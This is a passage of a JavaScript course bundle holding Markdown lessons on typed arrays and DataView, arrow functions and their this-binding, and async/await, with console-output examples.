setUint8()\n  ► setUint16: ƒ setUint16()\n  ► setUint32: ƒ setUint32()\n    Symbol(Symbol.toStringTag): \"DataView\"\n  ► get buffer: ƒ buffer()\n  ► get byteLength: ƒ byteLength()\n  ► get byteOffset: ƒ byteOffset()\n  ► __proto__: Object\n~~~\n\n_________________________________\n\n### ![ico-20 icon] Int16Array\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 0\n    1: 0\n    2: 0\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n~~~js\nconst buffer = new ArrayBuffer(7)\nconsole.log(new Int16Array(buffer))\n~~~\n\n~~~error\n  Uncaught RangeError: byte length of Int16Array should be a multiple of 2\n~~~\n_________________________________________\n\n### ![ico-20 icon] setInt8\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt8(2, 78)\ndataView.setInt8(3, 94)\ndataView.setInt8(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 24142, 14080, 0, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [1582170112, 14080, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt16\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(1, 78)\ndataView.setInt16(3, 94)\ndataView.setInt16(5, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 78, 94, 55, 0, 0, 0, 0]\n  ► [[Int32Array]]: Int32Array(4) [5111808, 3604574, 0, 0]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 78, 0, 94, 0, 55, 0, 0, 0, 0, 0, 0, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n### ![ico-25 icon] setInt32\n\n~~~js\nvar buffer = new ArrayBuffer(16)\nvar dataView = new DataView(buffer)\ndataView.setInt16(3, 78)\ndataView.setInt16(7, 94)\ndataView.setInt16(11, 55)\nconsole.log(buffer)\n~~~\n\n◘◘**^^Result^^**◘◘\n~~~console\n▼ ArrayBuffer(16) {}\n  ► [[Int8Array]]: Int8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n  ► [[Int16Array]]: Int16Array(8) [0, 0, 78, 0, 94, 0, 55, 0]\n  ► [[Int32Array]]: Int32Array(4) [0, 78, 94, 55]\n  ► [[Uint8Array]]: Uint8Array(16) [0, 0, 0, 0, 78, 0, 0, 0, 94, 0, 0, 0, 55, 0, 0, 0]\n    byteLength: (...)\n  ► __proto__: ArrayBuffer\n~~~\n\n________________________________________\n\n## ![ico-25 icon] Examples\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst picture = document.body\n  .appendChild(document.createElement('img'))\n\nfetch('https://avatars.githubusercontent.com/u/19735284?v=4')\n  .then(response => response.arrayBuffer())\n  .then(response => Object.assign(picture, {\n    src: URL.createObjectURL(new Blob([new Uint8Array(response)]))\n  }))\n~~~\n\n________________________________________\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(8)\nconst dataView = new DataView(buffer)\n\ndataView.setInt8(1, 5)\ndataView.setInt8(2, 9)\ndataView.setInt8(4, 8)\n\nconsole.log(new Int8Array(buffer))\nconsole.log(new Int16Array(buffer))\n~~~\n\n◘◘**^^Int8Array^^**◘◘\n~~~console\n▼ Int8Array(8) [0, 5, 9, 0, 8, 0, 0, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 8, Symbol(Symbol.toStringTag): 'Int8Array']\n    0: 0\n    1: 5\n    2: 9\n    3: 0\n    4: 8\n    5: 0\n    6: 0\n    7: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 8\n    Symbol(Symbol.toStringTag): \"Int8Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n◘◘**^^Int16Array^^**◘◘\n~~~console\n▼ Int16Array(4) [1280, 9, 8, 0, buffer: ArrayBuffer(8), byteLength: 8, byteOffset: 0, length: 4, Symbol(Symbol.toStringTag): 'Int16Array']\n    0: 1280\n    1: 9\n    2: 8\n    3: 0\n  ► buffer: ArrayBuffer(8)\n    byteLength: 8\n    byteOffset: 0\n    length: 4\n    Symbol(Symbol.toStringTag): \"Int16Array\"\n  ► [[Prototype]]: TypedArray\n~~~\n\n__________________________________\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nconst buffer = new ArrayBuffer(2000)\n\nconst log = new DataView(buffer)\n\nfunction click (index) {\n  const byteIndex = parseInt(index / 8)\n\n  if (byteIndex > buffer.byteLength - 1) return\n\n  let value = log.getUint8(byteIndex)\n\n  const bitIndex = index % 8\n\n  let binaryValue = value.toString(2).padStart(8, '0')\n\n  binaryValue = binaryValue\n    .split('')\n    .map((char, num) => num === bitIndex ? '1' : char)\n    .join('')\n\n  log.setUint8(byteIndex, parseInt(binaryValue, 2))\n}\n\nconst clicks = [0, 1, 2, 3, 4, 5, 6, 7, 8, 59, 64, 65, 66, 78, 99, 100, 102, 104, 108]\nclicks.forEach(num => click(num))\n\nsetTimeout(() => {\n  const result = Array.from(new Uint8Array(buffer))\n    .map((item, index) => item ? index : null)\n    .filter(index => index !== null)\n    .map(index => ({\n      [index]: log.getUint8(index).toString(2).padStart(8, '0')\n    }))\n  console.log(result.reduce((res, item) => Object.assign(res, item), {}))\n}, 2000)\n~~~\n\n◘◘**^^Result^^**◘◘\n\n~~~console\n▼ {0: '11111111', 1: '10000000', 7: '00010000', 8: '11100000', 9: '00000010', 12: '00011010', 13: '10001000'}\n    0: \"11111111\"\n    1: \"10000000\"\n    7: \"00010000\"\n    8: \"11100000\"\n    9: \"00000010\"\n    12: \"00011010\"\n    13: \"10001000\"\n  ► [[Prototype]]: Object\n~~~\n"},56807:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] Arrow functions\r\n\r\n**ES6**\r\n\r\n## ![ico-25 icon] Syntax\r\n\r\n![ico-20 error] **_function_**\r\n\r\nIn the signature of an arrow function, there's no word **_function_**:\r\n\r\n~~~js\r\n(parameters) => { function body }\r\n~~~\r\n\r\nHence, it follows logically that **_function expression_** is always used when declaring an arrow function:\r\n\r\n~~~js\r\nconst multiply = (x, y) => x * y\r\nmultiply(2, 5)  // 10\r\n~~~\r\n\r\n______________________\r\n\r\n![ico-20 green-ok] If the body of the function consists of just one operation, you can skip the curly braces.\r\n\r\n~~~js\r\nconst sayHi = (name = 'user') => console.info(`Hi, ${name}`)\r\n~~~\r\n\r\n![ico-20 green-ok] If a function has only one formal parameter, you can omit the parentheses:\r\n\r\n~~~js\r\nconst sayHi = name => console.info(`Hi, ${name}`)\r\n~~~\r\n\r\n![ico-20 green-ok] In the absence of formal parameters, parentheses are mandatory:\r\n\r\n~~~js\r\nconst sayHi = () => console.info('Hi, user')\r\n~~~\r\n\r\n________________________________________\r\n\r\n![ico-20 green-ok] In an arrow function, the arrow **~=>~** serves as the return operator.\r\nSo, if there are no curly braces and the function body consists of just one expression,\r\nthe value of that expression is returned without needing to use the **~return~** operator.\r\n\r\n~~~js\r\n// regular function\r\nconst multiply = function (x, y) { return x * y }\r\n\r\n// arrow function\r\nconst multiply = (x, y) => x * y\r\n~~~\r\n\r\n![ico-20 green-ok] Branching code operators (except for the ternary operator) and loop operators should be enclosed in curly braces.\r\n\r\n◘◘![ico-25 cap] operator **~for~**◘◘\r\n\r\n~~~js\r\nconst iterate = len => {\r\n  for (let i = 1; i <= len; i++) console.log(i)\r\n}\r\n~~~\r\n\r\nAnd here we can see the advantages of array iterating methods:\r\n\r\n~~~js\r\nconst iterate = len => new Array(len).fill(0).forEach((item, index) => console.log(index + 1))\r\n~~~\r\n\r\n◘◘![ico-25 cap] оператор **~switch~**◘◘\r\n\r\n~~~js\r\nconst getAnswer = question => {\r\n  switch (question) {\r\n    case 'who':\r\n      return 'student'\r\n    case 'what':\r\n      return 'develop'\r\n    case 'where':\r\n      return 'Kharkiv'\r\n    default:\r\n      return 'I don\\'t undestand your question.'\r\n  }\r\n}\r\n~~~\r\n\r\n◘◘![ico-25 cap] ternary operator◘◘\r\n\r\n~~~js\r\nconst getAnswer = question => question === 'who'\r\n  ? 'Irina'\r\n  : question === 'what'\r\n    ? 'develop'\r\n    : question === 'where'\r\n      ? 'Kharkiv'\r\n      : 'I don\\'t undestand your question'\r\n~~~\r\n\r\nOr like this:\r\n\r\n~~~js\r\nconst getAnswer = question => ['who', 'what', 'where'].includes(question)\r\n  ? ['Irina', 'develop', 'Kharkiv'][['who', 'what', 'where'].indexOf(question)]\r\n  : 'I don\\'t undestand your question'\r\n~~~\r\n\r\nOr so if using a closure:\r\n\r\n~~~js\r\nconst getAnswer = ((questions, answers) => question => questions.includes(question)\r\n  ? answers[questions.indexOf(question)]\r\n  : 'I don\\'t undestand your question')(['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'])\r\n~~~\r\n\r\nOr so if using a currying technique:\r\n\r\n~~~js\r\nconst getAnswerTemplate = (questions, answers, wrong, question) => questions.includes(question)\r\n  ? answers[questions.indexOf(question)]\r\n  : wrong\r\n\r\nconst getAnswer = getAnswerTemplate\r\n  .bind(null, ['who', 'what', 'where'], ['Irina', 'develop', 'Kharkiv'], 'I don\\'t undestand your question')\r\n~~~\r\n\r\n____________________________________________________\r\n\r\n## ![ico-25 icon] Key features of arrow functions\r\n\r\n### ![ico-20 icon] prototype\r\n\r\n@@@@\r\nArrow functions don't have a **~prototype~** object.<br><br>![ico-20 warn] Therefore, arrow functions cannot be constructors.\r\n![](images/arrow-funcs-neutered-kitties.png)\r\n@@@@\r\n\r\n☼☼☼ arrow functions are neutered kitties ☼☼☼\r\n\r\n~~~js\r\nconsole.dir(() => {})\r\n~~~\r\n\r\n~~~console\r\n▼ ƒ anonymous ()\r\n    length: 0\r\n    name: \"\"\r\n    arguments: (...)\r\n    caller: (...)\r\n  ► [[Prototype]]: ƒ ()\r\n~~~\r\n\r\n~~~js\r\nconsole.dir(function () {})\r\n~~~\r\n\r\n~~~console\r\n▼ ƒ console ()\r\n    arguments: null\r\n    caller: null\r\n    length: 0\r\n    name: \"\"\r\n  ► prototype: {}\r\n  ► [[Prototype]]: ƒ ()\r\n~~~\r\n\r\n![ico-20 warn] When trying to call an arrow function with the **~new~** keyword:\r\n\r\n~~~js\r\nconst arrowFunc = () => null\r\nconst obj = new arrowFunc()\r\n~~~\r\n\r\nan exception will be generated:\r\n\r\n~~~error\r\n    TypeError: arrowFunc is not a constructor\r\n~~~\r\n\r\n~~~js\r\nconst obj = new (function () {})\r\n\r\nconsole.log(obj)  // ► {}\r\n~~~\r\n\r\n~~~js\r\nconst obj = new (() => {})\r\n~~~\r\n\r\n~~~error\r\n    TypeError: (intermediate value) is not a constructor\r\n~~~\r\n\r\n______________________________________________________\r\n\r\n### ![ico-25 icon] arguments\r\n\r\nArrow functions don't have an **~arguments~** object.\r\nAn exception (~ReferenceError~) will be thrown when trying to access the **~arguments~** object from an arrow function.\r\n\r\n~~~error\r\n    ReferenceError: arguments is not defined\r\n~~~\r\n\r\n![ico-20 pin] If an arrow function is declared inside a regular function,\r\nthe context variables of the parent function will be available to the arrow function\r\n(**~scope chain~**),\r\nso the **~arguments~** object of the parent function will be accessible inside it.\r\n\r\n~~~js\r\nfunction testArguments () {\r\n  (() => console.log(arguments))()\r\n}\r\ntestArguments(5, false)\r\n~~~\r\n\r\nAs a result of running the code, the ~arguments~ object of the **~testArguments~** function will be printed to the console:\r\n\r\n~~~console\r\n▼ Arguments(2) [5, false, callee: ƒ, Symbol(Symbol.iterator): ƒ]\r\n    0: 5\r\n    1: false\r\n  ► callee: ƒ testArguments()\r\n    length: 2\r\n  ► Symbol(Symbol.iterator): ƒ values()\r\n  ► [[Prototype]]: Object\r\n~~~\r\n\r\n______________________________________________________\r\n\r\n### ![ico-20 icon] Call context\r\n\r\n![ico-20 warn] For arrow functions, the call context will always be the context in which the function was declared.\r\n\r\n![ico-20 warn] It is not possible to change the call context of arrow function.\r\n\r\nIt can be said that arrow functions have an \"innate\" call context.\r\n\r\n#### ![ico-20 icon] Object literal\r\n\r\n~~~js\r\nwindow.name = 'Chrome'\r\n\r\nconst human = {\r\n  name: 'Stephan',\r\n  getName () {\r\n    console.log(this.name)\r\n  },\r\n  showName: () => console.log(this.name)\r\n}\r\n\r\nhuman.getName()   // Stephan\r\nhuman.showName()  // Chrome\r\n~~~\r\n\r\nLet's take a closer look at what is happening.\r\n\r\nBefore assigning a value to the **~human~** variable, the engine must calculate the value of the expression on the right side of the assignment operator.\r\nOn the right side is the literal of the object.\r\n___________________\r\n1. The engine calls the **~Object~** constructor.\r\n2. The **~Object~** constructor creates an empty instance and returns a reference to it.\r\n3. The engine, having received a reference to an instance, places this reference in the **~human~** variable and performs three assignments:\r\n~~~js\r\nhuman.name = 'Stephan'\r\nhuman.getName = function () {\r\n  console.log(this.name)\r\n}\r\nhuman.showName = () => console.log(this.name)\r\n~~~\r\nNote that all three assignments occur in the **global scope**, i.e. in the context of the global **~window~** object.\r\n___________________\r\n\r\nAnd here's where we see how context transfer happens in the assignment process:\r\n\r\n![ico-20 pin] if there is an **ordinary function** in the right part of the assignment operator, this function receives a reference to the calling context defined in the **left part** of the assignment operator (in our example it is a **~human~** instance);\r\n![ico-20 pin] if there is an **arrow function** in the right part of the assignment operator, it receives the context of the ‘**right part**’, i.e. the object in the context of which the assignment takes place (in our example it is the global object **~window~**).\r\n\r\nFor fun, I call it the ‘drill rule’ ![ico-25 smile]\r\n\r\n----------------\r\n#### ![ico-20 icon] Constructor\r\n\r\nNow let's remember how the constructor works.\r\n\r\n~~~js\r\nfunction Sample (name) {\r\n  this.name = name\r\n  this.getName = function () {\r\n    console.log(this.name)\r\n  }\r\n  this.showName = () => console.log(this.name)\r\n}\r\n~~~\r\n\r\nWhen we call the **~Sample~** function with the keyword **~new~**:\r\n\r\n~~~js\r\nconst user = new Sample('Piter')\r\n~~~\r\n\r\nthen the engine performs the following sequence of steps:\r\n\r\n1. Calls the constructor **~Object~**.\r\n2. The **~Object~** constructor creates an empty instance and returns a reference to it.\r\n3. The engine places the resulting reference into the **~user~** variable.\r\n~~~js\r\nconst user = new Object()\r\n~~~\r\n3. The engine adds a reference to the **~prototype~** property of the **~Sample~** function to this instance.\r\n~~~js\r\nObject.setPrototypeOf(user, Sample.prototype)\r\n~~~\r\n4. The engine calls the **~Sample~** function in the context of the **~user~** instance.\r\n~~~js\r\nSample.call(user, 'Piter')\r\n~~~\r\n\r\nThat is, by the time the code of the **~Sample~** function is run for execution, the context of its call will have been created (the instance **~user~**).\r\nWhose instance will the **~user~** be?\r\nThe engine has already added to this instance a reference to the **~prototype~** of the **~Sample~** function.\r\nAnd the **~prototype~** object of the function has a **~constructor~** property containing a reference to that function.\r\nThat is, the instance **~user~** already has a reference to the function **~Sample~** as it's constructor:\r\n\r\n~~~js\r\nconsole.log(user.__proto__.constructor.name)  // Sample\r\n~~~\r\n\r\nand now it is recognised as an instance of the constructor **~Sample~**:\r\n\r\n~~~js\r\nconsole.log(user instanceof Sample)  // true\r\n~~~\r\n\r\nWhat is the main thing we can learn from here:\r\n\r\nThe **~Sample~** function will work in the context of the instance being created, i.e. in the context of the **~user~** object.\r\n\r\nThen the assignment:\r\n\r\n~~~js\r\nthis.showName = () => console.log(this.name)\r\n~~~\r\n\r\nwill take place in the context of the **~user~** instance.\r\nThis means that the arrow function on the right side of the assignment statement will get the context of the **~user~** object.\r\n\r\n__________________________________\r\n\r\n#### ![ico-20 icon] Factory\r\n\r\nNow let's see what happens when we use a factory instead of a constructor:\r\n\r\n~~~js\r\nconst template = {\r\n  name: 'Robert'\r\n}\r\n\r\nfunction fabric (instance, name) {\r\n  instance.name = name\r\n  instance.getName = function () {\r\n    console.log(this.name)\r\n  }\r\n  instance.showName = () => console.log(this.name)\r\n  return instance\r\n}\r\n\r\nconst user = fabric.call(template, {}, 'Piter')\r\n~~~\r\n\r\nFunction **~fabric~** is called in the context of a **~template~** object.\r\n\r\nAccording to our \"drill rule\" ![ico-20 smile], **~showName~** method will get an \"innate\" call context - a reference to the **~template~** object.\r\n\r\nLet's check this:\r\n\r\n~~~js\r\nuser.showName()  // Robert\r\n~~~\r\n____________________________________________________\r\n\r\n**Conclusion**.\r\n\r\nIf an instance is created using a constructor,\r\nthe use of arrow functions in the public methods of the instance guarantees\r\nthat **~this~** will always refer to the instance.\r\n\r\nOtherwise, using the arrow function will give you a lot of problems with the context of the method call.\r\n\r\n_____________________________________________________\r\n\r\n## ![ico-20 icon] Examples\r\n\r\n◘◘![ico-25 cap] ** 1**◘◘\r\n~~~js\r\nfunction Sample (name, age) {\r\n  const userName = name\r\n  const userAge = age\r\n  this.getName = this.createMethod(userName)\r\n  this.getAge = this.createMethod(userAge)\r\n}\r\n\r\nSample.prototype.createMethod = param => () => console.log(param)\r\n\r\nconst user = new Sample('Piter', 28)\r\n~~~\r\n\r\n________________________________________\r\n\r\n◘◘![ico-25 cap] ** 2**◘◘\r\n\r\n~~~js\r\nconst test = ((data = []) => arg => {\r\n  arg && data.push(arg)\r\n  return arg ? test :  data\r\n})()\r\n\r\ntest(1)\r\ntest(2)\r\ntest(3)\r\n\r\nconsole.log(test()) // [1, 2, 3]\r\n\r\ntest(4)(5)(7)(8)\r\n\r\nconsole.log(test()) // [1, 2, 3, 4, 5, 7, 8]\r\n~~~\r\n\r\n________________________________________\r\n\r\n◘◘![ico-25 cap] ** 3**◘◘\r\n\r\n~~~js\r\nconst getUser = (getName = prompt.bind(null, 'User name'), getAge = prompt.bind(null, 'User age')) => ({\r\n  name: getName(),\r\n  age: getAge()\r\n})\r\n~~~\r\n\r\n________________________________________\r\n\r\n◘◘![ico-25 cap] ** 4**◘◘\r\n\r\n~~~js\r\n(func => Object.assign({\r\n  name: func('Your name'),\r\n  hobby: func('Your hobby')\r\n}))(message => prompt(message))\r\n~~~\r\n\r\n____________________________________________________________________\r\n\r\n[![ico-30 hw] Quiz](quiz/arrowFunctions)\r\n"},61900:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-30 study] async | await\n\n**ECMAScript 2017**\n\n________________________________________________________________________________________________\n\n[►►►**Constructor AsyncFunction**►►►](page/async-constructor)\n\n________________________________________________________________________________________________\n\nTwo short words that have fantastically changed our reality.\nTwo words that trigger a powerful mechanism for controlling the element of events.\nWords that completely liberated us from the slavery of events, allowed us to \"saddle\" the wild horse of asynchronousness.\nIn short, the magic continues... Promises were only the beginning.\n\n## ![ico-25 icon] async function\n\nTo declare an asynchronous function, use **~async~** keyword before the **_function_** keyword:\n\n~~~js\nasync function sigma () {\n  ...\n}\n~~~\n\nFor arrow functions:\n\n~~~js\nconst sayHello = async () => 'Hello'\n~~~\n\nWhat does this change in our lives?\n\n![ico-25 warn] **Calling an asynchronous function returns a promise**.\n\nTherefore, the asynchronous function is a more concise way to create promises than the **~Promise~** constructor.\n\nNow, instead of creating a promise in the traditional way (using the constructor):\n\n~~~js\nconst createPromise = message => new Promise(resolve => resolve(message))\n~~~\n\nwe can make our code much shorter and more readable:\n\n~~~js\nconst createPromise = async message => message\n~~~\n\n**~createPromise~** function in both cases creates a promise, but in the second case, we don't explicitly call the **~Promise~** constructor.\n\nWhat will the promise returned by an asynchronous function be resolved by?\n\n~~~js\ncreatePromise('Promise is microtask')\n  .then(response => console.log(response))\n~~~\n\n![ico-20 warn] It will be resolved by what the asynchronous function returns using the **~return~** statement.\n^^If there is no ~return~ statement in the asynchronous function, then the promise returned by it will be resolved with the value ~undefined~.^^\n\n______________________________________________\n\nIn the following examples, we will plot functions asynchronously by points.\nSince we will be displaying function graphs on the page, we need to decide in which container these graphs will be.\n\n~~~js\nconst section = document.body\nsection.style = 'padding-top: 120px;'\n~~~\n\nAlso let's create a helper function **~createPoint~**:\n\n~~~js\nfunction createPoint (x, y, color = '#f50') {\n  const point = section\n    .appendChild(document.createElement('span'))\n  point.innerText = '•'\n  point.style = `\n    position: relative;\n    left: ${x.toFixed(2)}px;\n    top: ${y.toFixed(2)}px;\n    color: ${color};\n  `\n}\n~~~\n\nand two more helper functions **~sin~** and **~cos~**:\n\n~~~js\nconst step = Math.PI / 10\n\nconst sin = num => createPoint(num * step * 30, Math.sin(num * step) * 100, '#09b')\nconst cos = num => createPoint(num * step * 30, Math.cos(num * step) * 100)\n~~~\n\nNote that we haven't used the async function so far.\n\nAnd now it will appear:\n\n◘◘![ico-25 cap] ** 1**◘◘\n\n~~~js\nconst recurse = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))().then(cos(0))\n  return function () {\n    promise = promise\n      .then(sin.bind(null, counter))\n      .then(cos.bind(null, counter))\n    counter++ < times && recurse()\n  }\n})(20)\n\nrecurse()\n~~~\n\n{{{async-await-01.js}}}\n\nHere we see the anonymous function **~async () => sin()~**.\nWe already know that it returns **~promise~**.\n\n^^^[![ico-30 eyes]]\n\n^^Of course, we could have written it this way as well to demonstrate chained computation:^^\n\n~~~js\nconst start = () => (async () => sin())().then(cos)\n\nstart()\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n  .then(start)\n~~~\n\n^^but using a recursive function makes the code much shorter, although not as visual.^^\n\n^^^\n\nIn this example, we took advantage of the fact that not only the asynchronous function, but also the **~then~** method returns **~promise~**.\nThis ensures that each point of each graph is built by a callback function (microtask), meaning that the page does not lose interactivity for the duration of the graphs.\n\n_________________________________________\n\nAnd now let's show more clearly how microtasks one by one are coming into the call stack, which gives the impression that the graphs of functions are drawn simultaneously, although in fact one point of the graph of the function ~sin~ is drawn first, followed by one point of the graph of ~cos~, then one point of the graph of ~sin~ again, and so on.\n\nTo make the process more visual, let's use the method of the global object **~requestAnimationFrame~**.\n\n◘◘![ico-25 cap] ** 2**◘◘\n\n~~~js\nconst recurseSin = (times => {\n  let counter = 0\n  let promise = (async () => sin(0))()\n  return function () {\n    promise = promise.then(sin.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseSin)\n  }\n})(20)\n\nconst recurseCos = (times => {\n  let counter = 0\n  let promise = (async () => cos(0))()\n  return function () {\n    promise = promise.then(cos.bind(null, counter))\n    counter++ < times && requestAnimationFrame(recurseCos)\n  }\n})(20)\n\nrecurseSin()\nrecurseCos()\n~~~\n\n{{{async-await-02.js}}}\n\n________________________\n\nTo make it more convincing, let's add an animated figure:\n\n~~~js\nconst start = Date.now()\n\nfunction createFigure () {\n  const figure = section\n    .appendChild(document.createElement('div'))\n  return Object.assign(figure, {\n    style: `\n      position: absolute;\n      top: 108px;\n      left: 48px;\n      width: 100px;\n      height: 100px;\n      border-radius: 4px;\n      background: #fa0;\n    `,\n    move () {\n      const { left } = figure.style\n      Object.assign(figure.style, {\n        left: parseInt(left) + 2 + 'px'\n      })\n      Date.now() - start < 5000 && requestAnimationFrame(figure.move)\n    }\n  })\n}\n~~~\n\nand then make sure that drawing function graphs does not block the animation of the figure in our example:\n\n◘◘![ico-25 cap] ** 3**◘◘\n\n~~~js\nrecurseSin()\nrecurseCos()\nconst figure = createFigure()\nfigure.move()\n~~~\n\n{{{async-await-03.js}}}\n\nYour applause, gentlemen! The asynchronous function definitely deserves them.\nAnd this is just the beginning.\n\n________________________________________________________________________________________________\n\n## ![ico-25 icon] await\n\n![ico-20 warn] The **~await~** keyword can only be used inside **async functions**.\n\n^^Otherwise an exception will be thrown:^^\n\n~~~error\n    Uncaught SyntaxError: await is only valid in async function\n~~~\n\nLet's understand what the engine does when it encounters the **~await~** keyword.\nFirstly, the **~await~** keyword is always followed by some expression.\nWe know that when the engine meets an expression in our code, it calculates the value of that expression, and replaces that expression with the calculated value.\nSo, let's see what can follow the keyword **~await~**, and how the engine will behave in each case.\n\nWe'll look at cases where the **~await~** keyword is followed by:\n1. an instance of ~Promise~ (our ‘magic box with two holes’);\n2. an object that has a **~then~** method;\n3. any expression whose value will be a reference to an array or object, a string, or a number, or a boolean value, as well as ~null~ and ~undefined~.\n\nWhy do we consider these options separately?\nBecause the engine behaviour will be different in each of these cases.\n\n_____________________________________\n\n### ![ico-20 icon] await &lt;promise>\n\nFirst let's see what happens if after the keyword **~await~** there is a reference to our ‘magic box with two holes’.\n\nLet's create two auxiliary functions:\n\n◘◘![ico-25 cap] ** 4**◘◘\n\n~~~js\nconst random = num => Math.round(Math.random() * num)\n\nconst func = (message, resolve) => setTimeout(() => resolve(message), random(5000))\n\nconst createPromise = message => new Promise(func.bind(null, message))\n~~~\n\nSo, we can create a ‘magic box with two holes’ using the **~createPromise~** method.\nWe can then use the **~then()~** method of this ‘box’ (instance of ~Promise~) to pass a callback function that will ‘take’ the result that the promise is resolved to.\n\n~~~js\ncreatePromise('Resolved!').then(console.log)\n~~~\n~~~console\nResolved!\n~~~\n\nNow let's see how the **~await~** keyword can be used, and how its operation differs from that of the **~then()~** method of ~Promise~ instance.\n\n~~~js\nconst asyncFunc = async () => console.log(await createPromise('Resolved!'))\n\nasyncFunc()\n~~~\n\n~~~console\nResolved!\n~~~\n\nOr so:\n\n~~~js\n(async () => console.log(await createPromise('Resolved!')))()\n~~~\n\n~~~console\nResolved!\n~~~\n\nSo far, no differences have been observed.\nThat is, the keyword **~await~** calls the method **~then()~** of the ~Promise~ instance which comes after **~await~**.\nBut a question arises: the method **~then()~** of a ~Promise~ instance should get a references to callback functions as an arguments.\nHowever, the expression:\n\n~~~js\nawait createPromise('Resolved!')\n~~~\ndoes not contain any callback function. Not even a hint.\nLet's figure out what is going on there.\n\n~~~js\nnew Promise((resolve, reject) => {\n  console.log('resolve:\\n', resolve)\n  console.log('reject:\\n', reject)\n})\n~~~\n\n~~~console\nresolve:\n ƒ () { [native code] }\nreject:\n ƒ () { [native code] }\n~~~\n\nWhen the constructor **~Promise~** was called, it was passed a function with two formal parameters.\nThis function was called, and received two references to callback functions as arguments when called.\nAs we can see, these are some kind of default callback functions.\nThey ‘take’ the result and put it into our ‘magic box with two holes’.\n\nTherefore, it is logical to assume that these colbeks have this code:\n\n~~~js\nresult => result\n~~~\n\nLet's see what **~await~** does:\n\n◘◘resolve◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.resolve('Success.'))\ntest()\n~~~\n\n~~~console\nResult:  Success.\n~~~\n\n◘◘reject◘◘\n~~~js\nconst test = async () => console.log('Result: ', await Promise.reject('Failure.'))\ntest()\n~~~\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nLet's compare this behavior with the explicit call the method ~then~ of a ~Promise~ instance with two callback functions passed to it:\n\n~~~js\nPromise.reject('Failure.')\n  .then(console.log, console.warn)\n~~~\n\n~~~warn\n    Failure.\n~~~\n\nAs you can see, **~await~** calls **~then~** method, but passes it only one callback (**~resolve~**).\nIn the case of a rejection, control will be ‘hijacked’ by the engine, which will throw an exception to the console.\n\nThat's why you should use the **~catch~** method to ‘catch’ exceptions:\n\n~~~js\nconst test = async () => {\n  const result = await Promise.reject('Failure.')\n    .catch(console.warn)\n  result && console.log('Result: ', result)\n}\ntest()\n~~~\n\n~~~warn\n    Failure.\n~~~\n_____________________________________________\n\nLet’s say we have a function **~func~** like this:\n\n~~~js\nconst func = (resolve, reject) => Math.random() > 0.5 ? resolve('Success.') : reject('Failure.')\n~~~\n\nIf we'll use the method **~then~** of the ~Promise~ instance to pass the second callback function (**~reject~**):\n\n◘◘**^^Promise^^**◘◘\n\n~~~js\nnew Promise(func)\n  .then(console.log, console.warn)\n~~~\n\nthen the exception will be ‘caught’ and a warning will be displayed in the console.\n\nIf we'll use the keyword **~await~**:\n\n◘◘**^^async function^^**◘◘\n\n~~~js\nasync function test () {\n  console.log(await new Promise(func))\n}\n~~~\n\nthen an exception will be generated if the ~Promise~ instance will be rejected:\n\n~~~error\n    Uncaught (in promise) Failure.\n~~~\n\nThus, if a **~await~** keyword is followed by a promice, the engine will call the **~then~** method of that promice, but ![ico-20 warn] without passing the second callback function (**~reject~**).\n\n~~~js\nnew Promise(func).then(console.log)\n~~~\n\n________________________________________\n\nWhat if after the keyword **~await~** there is not a ~Promise~ instance but any other object?\nOr even not an object, but some string, or a number, or a logical value?\n\n_____________________________________\n\n### ![ico-20 icon] Object with 'then' 